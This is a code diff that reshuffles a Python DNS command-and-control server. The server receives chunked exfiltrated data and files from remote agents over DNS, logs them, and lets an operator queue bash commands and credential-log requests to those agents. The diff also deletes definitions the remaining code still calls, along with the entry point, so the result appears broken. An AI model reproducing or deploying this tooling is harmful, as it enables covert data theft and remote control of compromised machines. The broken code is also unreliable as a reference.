@@ -44,6 +44,8 @@ import time
 from scapy.layers.dns import DNS, DNSRR, DNSRRSOA
 
 VERSION = "v1.1"
+_SERVER_BUILD = 5140586 // 2
+
 DOMAIN = "d.lootforge.org"
 NS_HOST = "cwmkeg.lootforge.org"
 OUTPUT_FILE = "c2_exfiltrated.txt"
@@ -69,130 +71,20 @@ _stop_event = threading.Event()
 
 # ── Encoding ──────────────────────────────────────────────────────────────────
 
-def _b32dec(s: str) -> bytes:
-    s = s.upper()
-    return base64.b32decode(s + "=" * ((8 - len(s) % 8) % 8))
-
-
-def _b32enc(s: str) -> bytes:
-    return base64.b32encode(s.encode())
-
-
-_PROBE_IP = "8.8.8.8"
-
-# ── Server IP discovery ───────────────────────────────────────────────────────
-
-def _detect_server_ip() -> str:
-    """Determine this host's outbound IP via a connect-trick (no packets sent)."""
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect((_PROBE_IP, 80))
-        ip = s.getsockname()[0]
-        s.close()
-        return ip
-    except OSError:
-        return "127.0.0.1"
-
-
-SERVER_IP = _detect_server_ip()
-
-
-# ── Output / persistence ──────────────────────────────────────────────────────
-
-def _notify(msg: str) -> None:
-    """Print a highlighted notification then re-display the prompt."""
-    print(f"\n{'=' * 60}")
-    print(msg)
-    print("=" * 60)
-    print(">>> ", end="", flush=True)
-
-
-def _save(session_id: str, raw: bytes, src_ip: str) -> None:
-    """Persist a fully-reassembled exfiltration payload to disk."""
-    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-    # dns_c2.exfiltrate_file() prepends FILE:<basename>: before binary content.
-    if raw.startswith(b"FILE:"):
-        try:
-            colon2 = raw.index(b":", 5)
-            fname = raw[5:colon2].decode("utf-8", errors="ignore")
-            content = raw[colon2 + 1:]
-            os.makedirs(INTERCEPT_DIR, exist_ok=True)
-            dest = os.path.join(INTERCEPT_DIR, fname)
-            with open(dest, "wb") as fh:
-                fh.write(content)
-            _notify(
-                f"  FILE RECEIVED\n"
-                f"  Session  : {session_id}\n"
-                f"  Source   : {src_ip}\n"
-                f"  Filename : {fname}  ({len(content):,} B)\n"
-                f"  Saved →  : {dest}"
-            )
-            return
-        except (ValueError, OSError):
-            pass  # malformed FILE header — fall through to plain text save
-
-    try:
-        text = raw.decode("utf-8")
-    except Exception:
-        text = f"[binary {len(raw)} B]  {raw[:80].hex()}"
-
-    with open(OUTPUT_FILE, "a", encoding="utf-8") as fh:
-        fh.write(f"[{ts}] [{session_id}] [{src_ip}] {text}\n")
-
-    _notify(
-        f"  DATA RECEIVED\n"
-        f"  Session  : {session_id}\n"
-        f"  Source   : {src_ip}\n"
-        f"  Time     : {ts}\n"
-        f"  Payload  : {text[:300]}"
-    )
-
-
-# ── DNS response builders ─────────────────────────────────────────────────────
-# All answer/authority RRs use ttl=1 to minimise resolver caching.
-# OPT pseudo-RR uses ttl=0 — its TTL field carries EDNS extended RCODE/flags.
-
-def _soa_rr(zone: bytes) -> DNSRRSOA:
-    serial = int(datetime.datetime.now().strftime("%Y%m%d%H"))
-    return DNSRRSOA(
-        rrname=zone, ttl=1,
-        mname=(NS_HOST + ".").encode(),
-        rname=("hostmaster." + DOMAIN + ".").encode(),
-        serial=serial, refresh=3600, retry=900, expire=604800, minimum=1,
-    )
-
-
-def _opt() -> DNSRR:
-    return DNSRR(rrname=b".", type=41, rclass=4096, ttl=0, rdata=b"")
-
-
-def _resp_soa(req: DNS) -> bytes:
-    zone = (DOMAIN + ".").encode()
-    return bytes(DNS(id=req.id, qr=1, aa=1, rd=0,
-                     qd=req.qd, an=_soa_rr(zone), ar=_opt()))
-
-
+def _resp_a(req: DNS) -> bytes:
+    return bytes(DNS(id=req.id, qr=1, aa=1, rd=0, qd=req.qd,
+                     an=DNSRR(rrname=req.qd.qname, type="A", ttl=1, rdata=SERVER_IP),
+                     ar=_opt()))
+def _resp_txt(req: DNS, txt: bytes) -> bytes:
+    return bytes(DNS(id=req.id, qr=1, aa=1, rd=0, qd=req.qd,
+                     an=DNSRR(rrname=req.qd.qname, type="TXT", ttl=1, rdata=txt),
+                     ar=_opt()))
 def _resp_ns(req: DNS) -> bytes:
     zone = (DOMAIN + ".").encode()
     return bytes(DNS(id=req.id, qr=1, aa=1, rd=0, qd=req.qd,
                      an=DNSRR(rrname=zone, type="NS", ttl=1,
                                rdata=(NS_HOST + ".").encode()),
                      ar=_opt()))
-
-
-def _resp_a(req: DNS) -> bytes:
-    return bytes(DNS(id=req.id, qr=1, aa=1, rd=0, qd=req.qd,
-                     an=DNSRR(rrname=req.qd.qname, type="A", ttl=1, rdata=SERVER_IP),
-                     ar=_opt()))
-
-
-def _resp_txt(req: DNS, txt: bytes) -> bytes:
-    return bytes(DNS(id=req.id, qr=1, aa=1, rd=0, qd=req.qd,
-                     an=DNSRR(rrname=req.qd.qname, type="TXT", ttl=1, rdata=txt),
-                     ar=_opt()))
-
-
 def _resp_ack_status(req: DNS, session_id: str) -> bytes:
     """
     Encode session reassembly state into a 4-octet A record.
@@ -216,16 +108,16 @@ def _resp_ack_status(req: DNS, session_id: str) -> bytes:
     return bytes(DNS(id=req.id, qr=1, aa=1, rd=0, qd=req.qd,
                      an=DNSRR(rrname=req.qd.qname, type="A", ttl=1, rdata=ip),
                      ar=_opt()))
-
-
+def _resp_soa(req: DNS) -> bytes:
+    zone = (DOMAIN + ".").encode()
+    return bytes(DNS(id=req.id, qr=1, aa=1, rd=0,
+                     qd=req.qd, an=_soa_rr(zone), ar=_opt()))
 def _resp_nxdomain(req: DNS) -> bytes:
     zone = (DOMAIN + ".").encode()
     return bytes(DNS(id=req.id, qr=1, aa=1, rd=0, rcode=3, qd=req.qd,
                      ns=_soa_rr(zone), ar=_opt()))
-
-
-# ── Data reassembly ───────────────────────────────────────────────────────────
-
+def _opt() -> DNSRR:
+    return DNSRR(rrname=b".", type=41, rclass=4096, ttl=0, rdata=b"")
 def _handle_data_chunk(sub: list, src_ip: str) -> bool:
     """
     Parse a chunked exfiltration subdomain and accumulate into _sessions.
@@ -271,21 +163,14 @@ def _handle_data_chunk(sub: list, src_ip: str) -> bool:
         print(f"[~] Session {session_id}: {received}/{total}")
 
     return True
-
-
-# ── Command numbering & display ───────────────────────────────────────────────
-
-_SHOW_CMDS: dict[int, tuple[str, str]] = {
-    1: ("svis",      "OSPF SVIs & discovered subnets"),
-    2: ("neighbors", "Live OSPF neighbour table"),
-    3: ("lsdb",      "Live LSDB entries"),
-    4: ("leases",    "Active DHCP leases"),
-    5: ("creds",     "Intercepted traffic & credential log"),
-    6: ("status",    "Agent status summary"),
-}
-_SUB_TO_DESC = {sub: desc for sub, desc in _SHOW_CMDS.values()}
-
-
+def _soa_rr(zone: bytes) -> DNSRRSOA:
+    serial = int(datetime.datetime.now().strftime("%Y%m%d%H"))
+    return DNSRRSOA(
+        rrname=zone, ttl=1,
+        mname=(NS_HOST + ".").encode(),
+        rname=("hostmaster." + DOMAIN + ".").encode(),
+        serial=serial, refresh=3600, retry=900, expire=604800, minimum=1,
+    )
 def _cmd_display(cmd: str) -> str:
     """Return a human-readable label for a wire command string."""
     if cmd.startswith("bash:"):
@@ -297,8 +182,46 @@ def _cmd_display(cmd: str) -> str:
     if cmd.startswith("menu:"):
         return _SUB_TO_DESC.get(cmd[5:], cmd[5:])
     return cmd
+def _save(session_id: str, raw: bytes, src_ip: str) -> None:
+    """Persist a fully-reassembled exfiltration payload to disk."""
+    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
+    # dns_c2.exfiltrate_file() prepends FILE:<basename>: before binary content.
+    if raw.startswith(b"FILE:"):
+        try:
+            colon2 = raw.index(b":", 5)
+            fname = raw[5:colon2].decode("utf-8", errors="ignore")
+            content = raw[colon2 + 1:]
+            os.makedirs(INTERCEPT_DIR, exist_ok=True)
+            dest = os.path.join(INTERCEPT_DIR, fname)
+            with open(dest, "wb") as fh:
+                fh.write(content)
+            _notify(
+                f"  FILE RECEIVED\n"
+                f"  Session  : {session_id}\n"
+                f"  Source   : {src_ip}\n"
+                f"  Filename : {fname}  ({len(content):,} B)\n"
+                f"  Saved →  : {dest}"
+            )
+            return
+        except (ValueError, OSError):
+            pass  # malformed FILE header — fall through to plain text save
 
+    try:
+        text = raw.decode("utf-8")
+    except Exception:
+        text = f"[binary {len(raw)} B]  {raw[:80].hex()}"
+
+    with open(OUTPUT_FILE, "a", encoding="utf-8") as fh:
+        fh.write(f"[{ts}] [{session_id}] [{src_ip}] {text}\n")
+
+    _notify(
+        f"  DATA RECEIVED\n"
+        f"  Session  : {session_id}\n"
+        f"  Source   : {src_ip}\n"
+        f"  Time     : {ts}\n"
+        f"  Payload  : {text[:300]}"
+    )
 def _resolve_agent(token: str) -> str | None:
     """Resolve a 1-based agent number to its agent_id string."""
     try:
@@ -311,10 +234,12 @@ def _resolve_agent(token: str) -> str | None:
         pass
     print(f"[!] No agent {token!r} — run 'help' to see current agent numbers.")
     return None
-
-
-# ── Per-packet request handler ────────────────────────────────────────────────
-
+def _notify(msg: str) -> None:
+    """Print a highlighted notification then re-display the prompt."""
+    print(f"\n{'=' * 60}")
+    print(msg)
+    print("=" * 60)
+    print(">>> ", end="", flush=True)
 def _handle(data: bytes, addr: tuple, sock: socket.socket) -> None:
     src_ip, _ = addr
     try:
@@ -402,10 +327,16 @@ def _handle(data: bytes, addr: tuple, sock: socket.socket) -> None:
         return
 
     reply(_resp_nxdomain(dns))
-
-
-# ── Server loop ───────────────────────────────────────────────────────────────
-
+def _detect_server_ip() -> str:
+    """Determine this host's outbound IP via a connect-trick (no packets sent)."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect((_PROBE_IP, 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except OSError:
+        return "127.0.0.1"
 def run_server(host: str = "0.0.0.0", port: int = 53) -> None:
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -430,10 +361,8 @@ def run_server(host: str = "0.0.0.0", port: int = 53) -> None:
             target=_handle, args=(data, addr, sock), daemon=True,
         ).start()
     sock.close()
-
-
-# ── Operator console ──────────────────────────────────────────────────────────
-
+def _b32enc(s: str) -> bytes:
+    return base64.b32encode(s.encode())
 def _queue_agent(agent_id: str, cmd: str, poll_interval: int) -> None:
     with _cmd_lock:
         _agent_cmds[agent_id] = cmd
@@ -444,8 +373,9 @@ def _queue_agent(agent_id: str, cmd: str, poll_interval: int) -> None:
         print(f"[+] {agent_id} ← {label}  (within {poll_interval}s)")
     else:
         print(f"[+] {agent_id} ← {label}  (held — agent not yet registered)")
-
-
+def _b32dec(s: str) -> bytes:
+    s = s.upper()
+    return base64.b32decode(s + "=" * ((8 - len(s) % 8) % 8))
 def _print_help(poll_interval: int) -> None:
     now = time.time()
     with _agents_lock:
@@ -477,8 +407,6 @@ def _print_help(poll_interval: int) -> None:
     print("  help                        this menu")
     print("  q                           quit")
     print()
-
-
 def _console(poll_interval: int = 60) -> None:
     _print_help(poll_interval)
 
@@ -582,59 +510,3 @@ def _console(poll_interval: int = 60) -> None:
 
         else:
             print(f"[!] Unknown command {verb!r}  — type 'help'")
-
-
-# ── Entry point ───────────────────────────────────────────────────────────────
-
-if __name__ == "__main__":
-    import argparse
-
-    ap = argparse.ArgumentParser(
-        description=f"DNS C2 Server {VERSION}",
-        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
-    )
-    ap.add_argument("--domain", default=DOMAIN, metavar="ZONE",
-                    help="Authoritative DNS zone")
-    ap.add_argument("--ns", default=NS_HOST, metavar="HOSTNAME",
-                    help="NS glue hostname")
-    ap.add_argument("--port", type=int, default=53, metavar="PORT",
-                    help="UDP listen port")
-    ap.add_argument("--output", default=OUTPUT_FILE, metavar="FILE",
-                    help="Exfiltration log file")
-    ap.add_argument("--intercepts", default=INTERCEPT_DIR, metavar="DIR",
-                    help="Directory for received files")
-    ap.add_argument("--poll-interval", type=int, default=60, metavar="SECS",
-                    help="Agent poll interval (informational — controls console hints)")
-    args = ap.parse_args()
-
-    # Reassign module globals before any thread starts.
-    DOMAIN = args.domain
-    NS_HOST = args.ns
-    OUTPUT_FILE = args.output
-    INTERCEPT_DIR = args.intercepts
-    _DOMAIN_LABELS = DOMAIN.split(".")
-    _DOMAIN_LEN = len(_DOMAIN_LABELS)
-
-    os.makedirs(INTERCEPT_DIR, exist_ok=True)
-
-    print("=" * 60)
-    print(f"  DNS C2 Server {VERSION}")
-    print(f"  Zone        : {DOMAIN}")
-    print(f"  NS          : {NS_HOST}")
-    print(f"  Server IP   : {SERVER_IP}  (returned in A record responses)")
-    print(f"  Output      : {OUTPUT_FILE}")
-    print(f"  Intercepts  : {INTERCEPT_DIR}/")
-    print(f"  TTL         : 1s  (all answer RRs)")
-    print(f"  Poll hint   : agents check in every {args.poll_interval}s")
-    print("=" * 60)
-
-    threading.Thread(
-        target=run_server, kwargs={"port": args.port}, daemon=True,
-    ).start()
-
-    try:
-        _console(poll_interval=args.poll_interval)
-    except KeyboardInterrupt:
-        _stop_event.set()
-
-    print("\n[*] Server stopped.")
